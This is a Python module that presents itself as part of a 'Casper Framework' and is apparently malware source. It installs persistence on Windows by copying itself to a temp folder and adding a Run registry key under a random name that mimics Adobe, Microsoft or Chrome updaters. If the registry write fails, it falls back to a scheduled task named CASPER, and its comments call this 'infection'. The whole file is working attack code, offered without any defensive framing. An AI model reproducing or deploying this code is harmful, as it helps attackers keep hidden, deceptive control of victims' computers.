"""
Part of Casper Framework
"""
from imports import *

names = ["Adobe Update","Microsoft Update","Windows Update","OneDrive Update","Acrobat Reader Plugin","Outlook Plugin","Microsoft Office Update","Google Chrome Update"]

def registry():
	"""
	add registry entry with random name
	"""
	HKEY_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
	
	try:
		HKEY_open = OpenKey(HKEY_CURRENT_USER,HKEY_key,0,KEY_ALL_ACCESS)
		SetValueEx(HKEY_open,random.choice(names),0,REG_SZ,os.path.join(temp_directory(),sys.argv[0]))
		return True
	except Exception as e:
		return False

def backup_plan():
	"""
	if registry infection fails, we attempt to create a
	schtask that runs at startup/login
	"""
	if (create_task("CASPER",os.path.join(temp_directory(),sys.argv[0])) == True):
		return True
	else:
		return False
		
def infect_registry():
	"""
	clone myself to temp directory for storage
	and add registy key to gain persistence on
	the system
	"""
	if (clone(sys.argv[0]) == True):
		if (registry() == True):
			logging.debug("[casper] Finished registry infection")
			return True
		else:
			logging.debug("[casper] Error while adding registry key")
			return False
	else:
		logging.debug("[casper] Error while cloning myself")
		return False